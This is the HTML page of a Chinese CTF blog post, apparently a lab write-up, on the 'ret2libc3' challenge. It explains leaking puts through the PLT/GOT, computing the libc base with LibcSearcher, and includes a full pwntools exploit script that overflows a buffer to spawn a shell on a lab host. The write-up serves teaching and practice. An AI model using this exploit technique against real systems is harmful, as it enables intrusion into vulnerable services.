@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2libc3_old | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看文件基本属性：
+看到文件并没有开启PIE，所以代码段的地址是相对固定的。
+然后查看是否有system函数和/bin/sh
+可以看到并没有system函数，也没有/bin/sh
+搜索int 0x80也可以看到并没有：
+没有int 0x80也不能调用execve函数
+虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
+可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
+libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
+那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
+现在我们使用puts函数举例：
+​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
+所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
+payload = b&#39;a&#39;*(0x6c&#43;4) //padding&#43;p32(elf.plt[&#39;puts&#39;]) //使函数转跳到puts函数&#43;p32(main)	//puts函数的返回值&#43;p32(elf.got[&#39;puts&#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
+puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&#39;puts&#39;,hex(puts))	libc =LibcSearcher(&#39;puts&#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&#39;puts&#39;)	//计算基址system=libcbase&#43;libc.dump(&#39;system&#39;)	//计算出system函数的真实地址bin_sh=libcbase&#43;libc.dump(&#39;str_bin_sh&#39;)	///bin/sh的真实地址print(&#39;system&#39;,hex(system))print(&#39;binsh&#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
+因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
+payload2=b&#39;a&#39;*(0x64&#43;4)&#43;p32(system)&#43;p32(0xdeadbeef)&#43;p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&#39;a&#39;*(0x6c&#43;4)&#43;p32(elf.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2libc3_old/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2libc3_old" />
+<meta property="og:description" content="首先查看文件基本属性：
+看到文件并没有开启PIE，所以代码段的地址是相对固定的。
+然后查看是否有system函数和/bin/sh
+可以看到并没有system函数，也没有/bin/sh
+搜索int 0x80也可以看到并没有：
+没有int 0x80也不能调用execve函数
+虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
+可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
+libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
+那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
+现在我们使用puts函数举例：
+​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
+所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
+payload = b&#39;a&#39;*(0x6c&#43;4) //padding&#43;p32(elf.plt[&#39;puts&#39;]) //使函数转跳到puts函数&#43;p32(main)	//puts函数的返回值&#43;p32(elf.got[&#39;puts&#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
+puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&#39;puts&#39;,hex(puts))	libc =LibcSearcher(&#39;puts&#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&#39;puts&#39;)	//计算基址system=libcbase&#43;libc.dump(&#39;system&#39;)	//计算出system函数的真实地址bin_sh=libcbase&#43;libc.dump(&#39;str_bin_sh&#39;)	///bin/sh的真实地址print(&#39;system&#39;,hex(system))print(&#39;binsh&#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
+因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
+payload2=b&#39;a&#39;*(0x64&#43;4)&#43;p32(system)&#43;p32(0xdeadbeef)&#43;p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&#39;a&#39;*(0x6c&#43;4)&#43;p32(elf." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2libc3_old/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2libc3_old"/>
+<meta name="twitter:description" content="首先查看文件基本属性：
+看到文件并没有开启PIE，所以代码段的地址是相对固定的。
+然后查看是否有system函数和/bin/sh
+可以看到并没有system函数，也没有/bin/sh
+搜索int 0x80也可以看到并没有：
+没有int 0x80也不能调用execve函数
+虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
+可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
+libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
+那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
+现在我们使用puts函数举例：
+​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
+所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
+payload = b&#39;a&#39;*(0x6c&#43;4) //padding&#43;p32(elf.plt[&#39;puts&#39;]) //使函数转跳到puts函数&#43;p32(main)	//puts函数的返回值&#43;p32(elf.got[&#39;puts&#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
+puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&#39;puts&#39;,hex(puts))	libc =LibcSearcher(&#39;puts&#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&#39;puts&#39;)	//计算基址system=libcbase&#43;libc.dump(&#39;system&#39;)	//计算出system函数的真实地址bin_sh=libcbase&#43;libc.dump(&#39;str_bin_sh&#39;)	///bin/sh的真实地址print(&#39;system&#39;,hex(system))print(&#39;binsh&#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
+因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
+payload2=b&#39;a&#39;*(0x64&#43;4)&#43;p32(system)&#43;p32(0xdeadbeef)&#43;p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&#39;a&#39;*(0x6c&#43;4)&#43;p32(elf."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2libc3_old",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2libc3_old/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2libc3_old",
+  "name": "ret2libc3_old",
+  "description": "首先查看文件基本属性：\n看到文件并没有开启PIE，所以代码段的地址是相对固定的。\n然后查看是否有system函数和/bin/sh\n可以看到并没有system函数，也没有/bin/sh\n搜索int 0x80也可以看到并没有：\n没有int 0x80也不能调用execve函数\n虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：\n可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so\nlibc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。\n那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。\n现在我们使用puts函数举例：\n​\t当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。\n所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：\npayload = b\u0026#39;a\u0026#39;*(0x6c+4) //padding\r+p32(elf.plt[\u0026#39;puts\u0026#39;]) //使函数转跳到puts函数\r+p32(main)\t//puts函数的返回值\r+p32(elf.got[\u0026#39;puts\u0026#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：\nputs=u32(p.recv(4))\t//将接收到的地址放入puts中\rprint(\u0026#39;puts\u0026#39;,hex(puts))\tlibc =LibcSearcher(\u0026#39;puts\u0026#39;,puts)\t//在libcsearcher中寻找puts函数的偏移量\rlibcbase=puts-libc.dump(\u0026#39;puts\u0026#39;)\t//计算基址\rsystem=libcbase+libc.dump(\u0026#39;system\u0026#39;)\t//计算出system函数的真实地址\rbin_sh=libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;)\t///bin/sh的真实地址\rprint(\u0026#39;system\u0026#39;,hex(system))\rprint(\u0026#39;binsh\u0026#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法\n因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：\npayload2=b\u0026#39;a\u0026#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *\rfrom LibcSearcher import *\r#context.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x08048618\rif args.G:\rgdb.attach(p)\rpayload = b\u0026#39;a\u0026#39;*(0x6c+4)+p32(elf.",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看文件基本属性：\n看到文件并没有开启PIE，所以代码段的地址是相对固定的。\n然后查看是否有system函数和/bin/sh\n可以看到并没有system函数，也没有/bin/sh\n搜索int 0x80也可以看到并没有：\n没有int 0x80也不能调用execve函数\n虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：\n可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so\nlibc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。\n那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。\n现在我们使用puts函数举例：\n​\t当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。\n所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：\npayload = b'a'*(0x6c+4) //padding\r+p32(elf.plt['puts']) //使函数转跳到puts函数\r+p32(main)\t//puts函数的返回值\r+p32(elf.got['puts']) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：\nputs=u32(p.recv(4))\t//将接收到的地址放入puts中\rprint('puts',hex(puts))\tlibc =LibcSearcher('puts',puts)\t//在libcsearcher中寻找puts函数的偏移量\rlibcbase=puts-libc.dump('puts')\t//计算基址\rsystem=libcbase+libc.dump('system')\t//计算出system函数的真实地址\rbin_sh=libcbase+libc.dump('str_bin_sh')\t///bin/sh的真实地址\rprint('system',hex(system))\rprint('binsh',hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法\n因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：\npayload2=b'a'*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *\rfrom LibcSearcher import *\r#context.log_level = 'debug'\rp = remote('10.0.25.109',10007)\r#p = process('./ret2libc3')\relf = ELF('./ret2libc3')\rmain = 0x08048618\rif args.G:\rgdb.attach(p)\rpayload = b'a'*(0x6c+4)+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])\rp.recvuntil('?')\rp.sendline(payload)\rputs = u32(p.recv(4))\rprint('puts',hex(puts))\rlibc = LibcSearcher('puts',puts)\rlibcbase = puts-libc.dump('puts')\rsystem = libcbase+libc.dump('system')\rbin_sh = libcbase+libc.dump('str_bin_sh')\rprint('system',hex(system))\rprint('binsh',hex(bin_sh))\rpayload2 = b'a'*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh)\rp.sendline(payload2)\rp.interactive() 运行ret2libc3.py后，libcsearcher会让我们选择libc版本，我们选择程序的版本就行了\n",
+  "wordCount" : "99",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2libc3_old/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2libc3_old
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看文件基本属性：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325095115274.png" alt="image-20220325095115274"  />
+</p>
+<p>看到文件并没有开启PIE，所以代码段的地址是相对固定的。</p>
+<p>然后查看是否有system函数和/bin/sh</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325095418155.png" alt="image-20220325095418155"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325095619149.png" alt="image-20220325095619149"  />
+</p>
+<p>可以看到并没有system函数，也没有/bin/sh</p>
+<p>搜索int 0x80也可以看到并没有：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325100017854.png" alt="image-20220325100017854"  />
+</p>
+<p>没有int 0x80也不能调用execve函数</p>
+<p>虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325100321106.png" alt="image-20220325100321106"  />
+</p>
+<p>可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so</p>
+<p>libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。</p>
+<p>那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。</p>
+<p>现在我们使用puts函数举例：</p>
+<p>​		当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。</p>
+<p>所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：</p>
+<pre tabindex="0"><code>payload =   b&#39;a&#39;*(0x6c+4)          //padding
+			+p32(elf.plt[&#39;puts&#39;])  //使函数转跳到puts函数
+			+p32(main)			   //puts函数的返回值
+			+p32(elf.got[&#39;puts&#39;])  //利用puts函数输出puts函数的gots表上的地址
+</code></pre><p>上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：</p>
+<pre tabindex="0"><code>puts=u32(p.recv(4))							//将接收到的地址放入puts中
+print(&#39;puts&#39;,hex(puts))						
+libc =LibcSearcher(&#39;puts&#39;,puts)				//在libcsearcher中寻找puts函数的偏移量
+libcbase=puts-libc.dump(&#39;puts&#39;)				//计算基址
+system=libcbase+libc.dump(&#39;system&#39;)			//计算出system函数的真实地址
+bin_sh=libcbase+libc.dump(&#39;str_bin_sh&#39;)		///bin/sh的真实地址
+print(&#39;system&#39;,hex(system))
+print(&#39;binsh&#39;,hex(bin_sh))
+</code></pre><p>在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325160629948.png" alt="image-20220325160629948"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325160924402.png" alt="image-20220325160924402"  />
+</p>
+<p>因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：</p>
+<pre tabindex="0"><code>payload2=b&#39;a&#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh)
+</code></pre><pre tabindex="0"><code>from pwn import *
+from LibcSearcher import *
+
+#context.log_level = &#39;debug&#39;
+
+p = remote(&#39;10.0.25.109&#39;,10007)
+#p = process(&#39;./ret2libc3&#39;)
+
+
+elf = ELF(&#39;./ret2libc3&#39;)
+main = 0x08048618
+
+if args.G:
+	gdb.attach(p)
+
+payload = b&#39;a&#39;*(0x6c+4)+p32(elf.plt[&#39;puts&#39;])+p32(main)+p32(elf.got[&#39;puts&#39;])
+
+p.recvuntil(&#39;?&#39;)
+
+p.sendline(payload)
+
+puts = u32(p.recv(4))
+print(&#39;puts&#39;,hex(puts))
+libc = LibcSearcher(&#39;puts&#39;,puts)
+libcbase = puts-libc.dump(&#39;puts&#39;)
+system = libcbase+libc.dump(&#39;system&#39;)
+bin_sh = libcbase+libc.dump(&#39;str_bin_sh&#39;)
+print(&#39;system&#39;,hex(system))
+print(&#39;binsh&#39;,hex(bin_sh))
+payload2 = b&#39;a&#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh)
+
+p.sendline(payload2)
+p.interactive()
+</code></pre><p>运行ret2libc3.py后，libcsearcher会让我们选择libc版本，我们选择程序的版本就行了</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325113435209.png" alt="image-20220325113435209"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325142937260.png" alt="image-20220325142937260"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2libc3.img/image-20220325143015649.png" alt="image-20220325143015649"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2libc3_new/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2libc3_new</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2resolve1/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2resolve1</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
